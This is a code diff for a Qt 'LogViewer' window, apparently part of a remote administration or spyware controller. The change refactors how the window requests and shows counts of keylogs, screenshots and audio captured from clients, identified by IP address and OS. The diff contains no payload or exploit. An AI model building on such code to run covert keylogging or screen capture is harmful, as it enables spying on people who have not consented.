@@ -19,12 +19,13 @@ class LogViewer(QWidget, logViewerUi):
         QWidget.__init__(self)
         self.setupUi(self)
 
-        self.socket = args['sock']
+        self.moderator = args['moderator']
         self.client_id = args['key']
         self.client_alias = args['alias']
         self.client_ip_address = args['ip_address']
         self.client_os = args['os']
         self.session_id = args['session_id']
+        self.module_id = args['module_id']
 
         self.plots = {}
 
@@ -55,6 +56,9 @@ class LogViewer(QWidget, logViewerUi):
         self.init_ui()
         self.set_language()
         self.check_data_counts()
+
+    def signal(self, data):
+        self.callback(data)
 
     def init_ui(self):
         self.clientIdLine.setText(self.client_id)
@@ -107,29 +111,31 @@ class LogViewer(QWidget, logViewerUi):
             self.screenshotsEnableButton.setChecked(False)
             self.keylogsEnableButton.setChecked(False)
 
+    def check_data_counts(self):
+        '''
+        Send Count Data Signal
+        :return:
+        '''
+        self.update_date()
+        self.moderator.send_msg('%s %s' % (self.client_id, self.date), 'countData', session_id=self.session_id, module_id=self.module_id)
+        self.callback = self.recv_data_counts
+
+    def recv_data_counts(self, data):
+        '''
+        Receive Count Data Signal
+        :param data:
+        :return:
+        '''
+        counted_logs = data['payload']
+        self.screenshotsCountNewLabel.setText(str(counted_logs['screenshots']['new']))
+        self.screenshotsCountOldLabel.setText(str(counted_logs['screenshots']['old']))
+        self.keylogsCountNewLabel.setText(str(counted_logs['keylogs']['new']))
+        self.keylogsCountOldLabel.setText(str(counted_logs['keylogs']['old']))
+        self.audioCountNewLabel.setText(str(counted_logs['audio']['new']))
+        self.audioCountOldLabel.setText(str(counted_logs['audio']['old']))
+
     def update_date(self):
         self.date = str(self.timeCalendar.selectedDate().toPyDate())
-
-    def check_data_counts(self):
-        self.update_date()
-
-        # Check Screenshots
-        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countScreenshots', session_id=self.session_id)
-        new, old = data['payload'].split('/')
-        self.screenshotsCountNewLabel.setText(new)
-        self.screenshotsCountOldLabel.setText(old)
-
-        # Check Keylogs
-        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countKeylogs', session_id=self.session_id)
-        new, old = data['payload'].split('/')
-        self.keylogsCountNewLabel.setText(new)
-        self.keylogsCountOldLabel.setText(old)
-
-        # Check Audio
-        data = data_get(self.socket, '%s %s' % (self.client_id, self.date), 'countAudios', session_id=self.session_id)
-        new, old = data['payload'].split('/')
-        self.audioCountNewLabel.setText(new)
-        self.audioCountOldLabel.setText(old)
 
     def open_screenshot(self):
         current_screenshot_path = str(self.screenshotsTable.item(self.screenshotsTable.currentRow(), 2).text())
